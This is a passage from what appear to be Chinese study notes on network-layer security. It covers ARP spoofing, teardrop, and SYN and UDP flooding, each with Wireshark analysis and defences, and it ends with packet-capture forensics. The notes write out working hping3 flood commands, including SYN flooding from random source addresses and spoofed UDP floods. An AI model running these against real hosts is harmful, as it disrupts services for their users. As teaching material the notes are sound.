srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h4 id="查找源头端口"><a href="#查找源头端口" class="headerlink" title="查找源头端口"></a>查找源头端口</h4><p>交换机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">display mac-address</span><br></pre></td></tr></table></figure><p>找到对应的端口<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605756855361-66220b4e-54d5-403c-a181-0bacbd3849e3.png#align=left&display=inline&height=437&margin=%5Bobject%20Object%5D&name=image.png&originHeight=874&originWidth=1508&size=566939&status=done&style=none&width=754" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605756855361-66220b4e-54d5-403c-a181-0bacbd3849e3.png#align=left&display=inline&height=437&margin=%5Bobject%20Object%5D&name=image.png&originHeight=874&originWidth=1508&size=566939&status=done&style=none&width=754" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h4 id="防御策略"><a href="#防御策略" class="headerlink" title="防御策略"></a>防御策略</h4><p>限制交换机端口 MAC 地址数量，比如这个端口只能有3或5个，那他就只能添加3或5跳记录到CAM表，那么就无法溢出啦。</p><h3 id="STP操纵"><a href="#STP操纵" class="headerlink" title="STP操纵"></a>STP操纵</h3><p>生成树协议按照树的结构构造网络拓扑，避免形成回路。STP协议中的各交换机通过交换BPDU报文信息传播生成树信息，如果伪造BPDU报文，控制交换机的端口转发状态，从而动态改变网络拓扑，劫持网络流量到本地。</p><h3 id="广播风暴"><a href="#广播风暴" class="headerlink" title="广播风暴"></a>广播风暴</h3><p>ARP DHCP 通过在局域网中广播，占用网络资源，网络性能下降 -&gt; 网络速度变慢<br>产生原因</p><ul><li>网络短路引发广播风暴 -&gt; 8根连接 两两连接 -&gt; 互联网上网线导致网络性能下降</li><li>网络中存在环路引发广播风暴</li><li>网卡损坏引发广播风暴</li><li>蠕虫病毒引发广播风暴</li></ul><h2 id="网络层安全"><a href="#网络层安全" class="headerlink" title="网络层安全"></a>网络层安全</h2><h3 id="中间人安全测试-欺骗"><a href="#中间人安全测试-欺骗" class="headerlink" title="中间人安全测试 - 欺骗"></a>中间人安全测试 - 欺骗</h3><h4 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h4><ul><li>局域网内用来寻找主机发送数据包的协议，通过它可以找到指定 IP 地址对应的 MAC地址</li><li>每台终端设备都具有ARP缓存表<ul><li><code>arp -a</code> 查看缓存表</li><li><code>arp -d</code> 删除缓存表</li><li>表的填充，寻找 IP 地址对应MAC地址，如果没有则广播此时设置的目标MAC地址为 (00:00:00:00:00:00) 是否具有IP地址对应的MAC地址，找到填充。</li></ul></li></ul><h4 id="ARP协议分析介绍"><a href="#ARP协议分析介绍" class="headerlink" title="ARP协议分析介绍"></a>ARP协议分析介绍</h4><p>显示过滤器</p><ul><li>arp</li><li>请求数据包<ul><li>arp.opcode == 0x0001</li></ul></li><li>响应数据包<ul><li>arp.opcode == 0x0002</li></ul></li><li>查看源 MAC 地址<ul><li>arp.src.hw_mac == 00:00:00:00:00:00</li><li>arp.src.hw_mac == 00:00:00:00:00:00 &amp;&amp; arp.opcode == 0x0002</li></ul></li></ul><h4 id="专家系统分析"><a href="#专家系统分析" class="headerlink" title="专家系统分析"></a>专家系统分析</h4><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605765841082-6ff4962a-2263-4a9d-91a3-c7c7de181c55.png#align=left&display=inline&height=111&margin=%5Bobject%20Object%5D&name=image.png&originHeight=222&originWidth=1902&size=25972&status=done&style=none&width=951" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605765841082-6ff4962a-2263-4a9d-91a3-c7c7de181c55.png#align=left&display=inline&height=111&margin=%5Bobject%20Object%5D&name=image.png&originHeight=222&originWidth=1902&size=25972&status=done&style=none&width=951" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>网关地址与局域网中的计算机具有一致的MAC地址<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605765875092-b18fe093-4d31-49d3-8ce6-b0970dc062a9.png#align=left&display=inline&height=234&margin=%5Bobject%20Object%5D&name=image.png&originHeight=468&originWidth=1358&size=730973&status=done&style=none&width=679" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605765875092-b18fe093-4d31-49d3-8ce6-b0970dc062a9.png#align=left&display=inline&height=234&margin=%5Bobject%20Object%5D&name=image.png&originHeight=468&originWidth=1358&size=730973&status=done&style=none&width=679" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h4 id="出现大量ARP数据包的原因"><a href="#出现大量ARP数据包的原因" class="headerlink" title="出现大量ARP数据包的原因"></a>出现大量ARP数据包的原因</h4><ul><li>ARP主机扫描</li><li>ARP病毒进行通信</li><li>ARP欺骗 中间人安全测试</li></ul><h4 id="防御ARP欺骗措施"><a href="#防御ARP欺骗措施" class="headerlink" title="防御ARP欺骗措施"></a>防御ARP欺骗措施</h4><ul><li>静态绑定ARP表<ul><li>arp -s 网关的IP地址 网关的MAC地址<ul><li>不适合大型网络使用</li><li>需要管理员权限</li><li>win <code>netsh i i show in</code> -&gt; 查看网卡编号</li><li>win <code>netsh -c &quot;i i&quot; add neighbors &lt;网卡编号&gt; &lt;网关IP地址&gt; &lt;网关MAC地址&gt;</code></li></ul></li></ul></li></ul><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605768196250-3b6f5a7b-e2a3-448d-8b6e-d6534a814bdf.png#align=left&display=inline&height=218&margin=%5Bobject%20Object%5D&name=image.png&originHeight=480&originWidth=1516&size=593279&status=done&style=stroke&width=687" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605768196250-3b6f5a7b-e2a3-448d-8b6e-d6534a814bdf.png#align=left&display=inline&height=218&margin=%5Bobject%20Object%5D&name=image.png&originHeight=480&originWidth=1516&size=593279&status=done&style=stroke&width=687" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><pre><code>  - 验证是否静态绑定 `arp -a`</code></pre><ul><li>交换机也有端口安全配置，固定MAC和IP使用端口<ul><li>不适合大型网络使用</li></ul></li><li>交换机 DHCP-Snooping<ul><li>交换机监听DHCP数据，提取IP和MAC建立DHCP Snooping的绑定表</li></ul></li><li>划分VLAN<ul><li>每一个VLAN就是一个广播域 -&gt; 限制网络范围</li></ul></li></ul><h3 id="泪滴安全测试"><a href="#泪滴安全测试" class="headerlink" title="泪滴安全测试"></a>泪滴安全测试</h3><p>原理介绍</p><ul><li>针对于IP协议的安全测试，主要是伪造IP地址和发送畸形数据包</li><li>向目标发送畸形数据包，使得IP数据包碎片在重组的过程中有重合的部分（偏移位置不够），从而导致目标系统无法进行重组，进一步导致系统奔溃而停止服务。</li></ul><p>下载IP协议案例数据包: <a href="https://wiki.wireshark.org/SampleCaptures?action=AttachFile&do=get&target=teardrop.cap">https://wiki.wireshark.org/SampleCaptures?action=AttachFile&amp;do=get&amp;target=teardrop.cap</a></p><p>根据数据包表示 Identification 来确实是否属于同一分组<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605768822557-4469d415-8fb1-41f5-ad0b-7fbdfc713d8c.png#align=left&display=inline&height=454&margin=%5Bobject%20Object%5D&name=image.png&originHeight=908&originWidth=1780&size=235391&status=done&style=none&width=890" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605768822557-4469d415-8fb1-41f5-ad0b-7fbdfc713d8c.png#align=left&display=inline&height=454&margin=%5Bobject%20Object%5D&name=image.png&originHeight=908&originWidth=1780&size=235391&status=done&style=none&width=890" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>分析 第8和第9个数据包<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605770172122-e947f493-6485-40e5-b24f-372f33908a7a.png#align=left&display=inline&height=428&margin=%5Bobject%20Object%5D&name=image.png&originHeight=856&originWidth=2088&size=223939&status=done&style=none&width=1044" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605770172122-e947f493-6485-40e5-b24f-372f33908a7a.png#align=left&display=inline&height=428&margin=%5Bobject%20Object%5D&name=image.png&originHeight=856&originWidth=2088&size=223939&status=done&style=none&width=1044" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>偏移量仅为 24，远不够36。<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605770235520-f1bfbd04-dae5-411c-a191-3c65013266ae.png#align=left&display=inline&height=407&margin=%5Bobject%20Object%5D&name=image.png&originHeight=814&originWidth=2128&size=235361&status=done&style=none&width=1064" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605770235520-f1bfbd04-dae5-411c-a191-3c65013266ae.png#align=left&display=inline&height=407&margin=%5Bobject%20Object%5D&name=image.png&originHeight=814&originWidth=2128&size=235361&status=done&style=none&width=1064" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>因此无法重组</p><p>不过对现在的计算机来说，泪滴测试不会对计算机造成很大的影响，所以基本不关心泪滴安全测试了。不够泪滴测试和ARP泛洪结合，还是能对计算机造成很大的困扰。</p><h2 id="传输层安全"><a href="#传输层安全" class="headerlink" title="传输层安全"></a>传输层安全</h2><p>传输层主要针对TCP和UDP协议，因此拒绝服务DOS（Denial of Service）也主要是基于这两个协议 </p><h3 id="TCP-SYN-泛洪"><a href="#TCP-SYN-泛洪" class="headerlink" title="TCP SYN 泛洪"></a>TCP SYN 泛洪</h3><h4 id="TCP连接介绍"><a href="#TCP连接介绍" class="headerlink" title="TCP连接介绍"></a>TCP连接介绍</h4><ul><li>客户端发送SYN到服务器</li><li>服务器响应 SYN+ACK 到客户机</li><li>客户机发送ACK到服务器</li></ul><p>使用 wireshark 分析 TCP 三次握手数据包<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605793725479-0c582547-d917-4fc3-9cff-31c4d18b2c2b.png#align=left&display=inline&height=147&margin=%5Bobject%20Object%5D&name=image.png&originHeight=294&originWidth=2562&size=134618&status=done&style=none&width=1281" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605793725479-0c582547-d917-4fc3-9cff-31c4d18b2c2b.png#align=left&display=inline&height=147&margin=%5Bobject%20Object%5D&name=image.png&originHeight=294&originWidth=2562&size=134618&status=done&style=none&width=1281" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h4 id="TCP-SYN-flooding-安全测试"><a href="#TCP-SYN-flooding-安全测试" class="headerlink" title="TCP SYN flooding 安全测试"></a>TCP SYN flooding 安全测试</h4><p>原理</p><ul><li>客户端发送syn服务端返回syn+ack，如果客户端不再发送ack，那么服务端将等待超时，重新发送syn+ack。如果是大量的等待，就可能导致服务器奔溃。</li></ul><p>案例演示</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping3 -q -n --rand-source -S -p 80 --flood &lt;目标IP地址&gt;</span><br></pre></td></tr></table></figure><ul><li>-q: 安静模式 </li><li>-n: 数字化输出，象征性输出主机地址</li><li>–rand-source: 随机源IP</li><li>-S: 发送SYN数据包</li><li>-p: 指向端口</li><li>–flood: 使用泛洪</li></ul><p>为了便于分析。打开 Statistics -&gt; Flow Graph<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605798164166-c6513ee3-00d1-44ae-96a3-f1e112fa6e14.png#align=left&display=inline&height=411&margin=%5Bobject%20Object%5D&name=image.png&originHeight=822&originWidth=976&size=115134&status=done&style=none&width=488" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605798164166-c6513ee3-00d1-44ae-96a3-f1e112fa6e14.png#align=left&display=inline&height=411&margin=%5Bobject%20Object%5D&name=image.png&originHeight=822&originWidth=976&size=115134&status=done&style=none&width=488" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>先选择流类型为TCP<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605799515559-2a58b00c-81af-4d24-af39-eb8c19774b5d.png#align=left&display=inline&height=678&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1356&originWidth=1806&size=131163&status=done&style=none&width=903" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605799515559-2a58b00c-81af-4d24-af39-eb8c19774b5d.png#align=left&display=inline&height=678&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1356&originWidth=1806&size=131163&status=done&style=none&width=903" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>发现客户端发送syn服务端返回syn+ack，但客户端不再发送ack，导致资源消耗。</p><h4 id="TCP-SYN-flooding安全防御"><a href="#TCP-SYN-flooding安全防御" class="headerlink" title="TCP SYN flooding安全防御"></a>TCP SYN flooding安全防御</h4><ul><li>丢弃第一个SYN数据包 -&gt; 用户体验差</li><li>反向探测 -&gt; 向源地址方向发送探测包，确定源地址合法性</li><li>代理模式 -&gt; 防火墙代理 -&gt; 即先与防火墙建立tcp连接</li></ul><h3 id="UDP-泛洪"><a href="#UDP-泛洪" class="headerlink" title="UDP 泛洪"></a>UDP 泛洪</h3><p>非连接状态的协议，简洁协议，控制选项少，不可靠，传输速率高，适合大文件传输</p><p>UDP协议关键点</p><ul><li>源端口</li><li>目的端口</li><li>UDP报文长度</li><li>检验码</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605839057960-48412a34-8873-4ff3-9044-f54e09ea3cfb.png#align=left&display=inline&height=630&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1260&originWidth=1632&size=255005&status=done&style=none&width=816" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605839057960-48412a34-8873-4ff3-9044-f54e09ea3cfb.png#align=left&display=inline&height=630&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1260&originWidth=1632&size=255005&status=done&style=none&width=816" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h4 id="UDP-flooding-安全测试"><a href="#UDP-flooding-安全测试" class="headerlink" title="UDP flooding 安全测试"></a>UDP flooding 安全测试</h4><p>原理: 测试人员向目标发送大量巨大的UDP数据包，就会使网络资源被耗尽</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo hping3 -q -n -a &lt;fake_ip&gt; --udp -s 53 -p &lt;dst_port&gt; --flood &lt;target_ip&gt; -d 1000</span><br></pre></td></tr></table></figure><p>-a: 伪造的 ip<br>-s: 53端口<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605840005031-623d1d8e-754a-422d-a359-193d2d5888c1.png#align=left&display=inline&height=647&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1294&originWidth=1852&size=317845&status=done&style=none&width=926" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605840005031-623d1d8e-754a-422d-a359-193d2d5888c1.png#align=left&display=inline&height=647&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1294&originWidth=1852&size=317845&status=done&style=none&width=926" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h4 id="UDP-flooding-安全防御"><a href="#UDP-flooding-安全防御" class="headerlink" title="UDP flooding 安全防御"></a>UDP flooding 安全防御</h4><p>防火墙</p><ul><li>限流: 将链路中的UDP报文控制在合理的范围，当超过指定值，则丢弃UDP报文</li><li>指纹学习: 先学习，在匹配</li></ul><h3 id="网络取证简析"><a href="#网络取证简析" class="headerlink" title="网络取证简析"></a>网络取证简析</h3><h4 id="wireshark-恢复传输文件"><a href="#wireshark-恢复传输文件" class="headerlink" title="wireshark 恢复传输文件"></a>wireshark 恢复传输文件</h4><p>无论使用何种应用层协议，对于传输层来说都是TCP或UDP协议，来恢复一下wireshark官网提供的文件<br><a href="https://wiki.wireshark.org/SampleCaptures?action=AttachFile&do=view&target=http_with_jpegs.cap.gz">https://wiki.wireshark.org/SampleCaptures?action=AttachFile&amp;do=view&amp;target=http_with_jpegs.cap.gz</a><br><a href="https://www.yuque.com/attachments/yuque/0/2020/gz/2789727/1605840476295-da677716-cade-446a-9ad6-7b5cd60564d5.gz?_lake_card=%7B%22uid%22:%221605840475936-0%22,%22src%22:%22https://www.yuque.com/attachments/yuque/0/2020/gz/2789727/1605840476295-da677716-cade-446a-9ad6-7b5cd60564d5.gz%22,%22name%22:%22http_with_jpegs.cap.gz%22,%22size%22:261947,%22type%22:%22application/x-gzip%22,%22ext%22:%22gz%22,%22progress%22:%7B%22percent%22:99%7D,%22status%22:%22done%22,%22percent%22:0,%22id%22:%22jhjjK%22,%22card%22:%22file%22%7D">http_with_jpegs.cap.gz</a></p><p>首先在显示过滤器中筛选具有jpeg内容的数据包: <code>http contains &quot;jpeg&quot;</code><br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605840700672-307192b2-795c-44f9-acb5-6767a5d42d25.png#align=left&display=inline&height=343&margin=%5Bobject%20Object%5D&name=image.png&originHeight=686&originWidth=2212&size=291904&status=done&style=none&width=1106" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605840700672-307192b2-795c-44f9-acb5-6767a5d42d25.png#align=left&display=inline&height=343&margin=%5Bobject%20Object%5D&name=image.png&originHeight=686&originWidth=2212&size=291904&status=done&style=none&width=1106" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>选第一个，追踪tcp流<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605841239748-c5db8b2a-ec6e-47bf-88b1-99de7e7c3c32.png#align=left&display=inline&height=561&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1122&originWidth=1936&size=546540&status=done&style=none&width=968" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605841239748-c5db8b2a-ec6e-47bf-88b1-99de7e7c3c32.png#align=left&display=inline&height=561&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1122&originWidth=1936&size=546540&status=done&style=none&width=968" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605841334136-f96a6202-6552-4285-bb72-ab952c06e7f3.png#align=left&display=inline&height=792&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1584&originWidth=1540&size=557977&status=done&style=none&width=770" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605841334136-f96a6202-6552-4285-bb72-ab952c06e7f3.png#align=left&display=inline&height=792&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1584&originWidth=1540&size=557977&status=done&style=none&width=770" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>最后点一下 Save as… 保存为 xxx.bin 就好，然后用16进制编辑器打开，JPEG的文件开始字节为 <code>FF D8</code>，文件结束字节为 <code>FF D9</code><br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605841552240-181bfa3f-e3d5-4362-b799-f327fb66fa23.png#align=left&display=inline&height=506&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1012&originWidth=1540&size=345491&status=done&style=none&width=770" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605841552240-181bfa3f-e3d5-4362-b799-f327fb66fa23.png#align=left&display=inline&height=506&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1012&originWidth=1540&size=345491&status=done&style=none&width=770" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>然后把其余没用的都删除掉，这里因为结束符号就是最后了，因此把上图 <code>FF D8</code> 之前的都删除掉就好了。<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605841622742-4b8536ae-007b-4b11-a12c-163fd7fc896c.png#align=left&display=inline&height=394&margin=%5Bobject%20Object%5D&name=image.png&originHeight=788&originWidth=1584&size=394632&status=done&style=none&width=792" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605841622742-4b8536ae-007b-4b11-a12c-163fd7fc896c.png#align=left&display=inline&height=394&margin=%5Bobject%20Object%5D&name=image.png&originHeight=788&originWidth=1584&size=394632&status=done&style=none&width=792" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605841661621-38e7cf54-e921-4853-a5a8-3fc07c000734.png#align=left&display=inline&height=593&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1186&originWidth=1444&size=1359525&status=done&style=none&width=722" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605841661621-38e7cf54-e921-4853-a5a8-3fc07c000734.png#align=left&display=inline&height=593&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1186&originWidth=1444&size=1359525&status=done&style=none&width=722" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>成功恢复。</p><h4 id="取证实践案例"><a href="#取证实践案例" class="headerlink" title="取证实践案例"></a>取证实践案例</h4><p><a href="https://forensicscontest.com/2009/09/25/puzzle-1-anns-bad-aim">https://forensicscontest.com/2009/09/25/puzzle-1-anns-bad-aim</a><br>好像没了。。。然后在Github找了个: <a href="https://github.com/aarud/Pcaps/blob/master/evidence01.pcap">https://github.com/aarud/Pcaps/blob/master/evidence01.pcap</a></p><h5 id="1-寻找Ann的通信好友名称"><a href="#1-寻找Ann的通信好友名称" class="headerlink" title="1.寻找Ann的通信好友名称"></a>1.寻找Ann的通信好友名称</h5><p>根据题目名称提示 aim 通信，wireshark 自带 aim 解密<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605772208918-064aee2d-3b2b-4ed9-9f43-d654d1237f56.png#align=left&display=inline&height=381&margin=%5Bobject%20Object%5D&name=image.png&originHeight=762&originWidth=1042&size=277791&status=done&style=none&width=521" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605772208918-064aee2d-3b2b-4ed9-9f43-d654d1237f56.png#align=left&display=inline&height=381&margin=%5Bobject%20Object%5D&name=image.png&originHeight=762&originWidth=1042&size=277791&status=done&style=none&width=521" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>这三项依次改为<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605772589738-830ff49d-bc78-46db-8c3e-0065aef1936e.png#align=left&display=inline&height=80&margin=%5Bobject%20Object%5D&name=image.png&originHeight=160&originWidth=942&size=33306&status=done&style=none&width=471" class="lazyload" 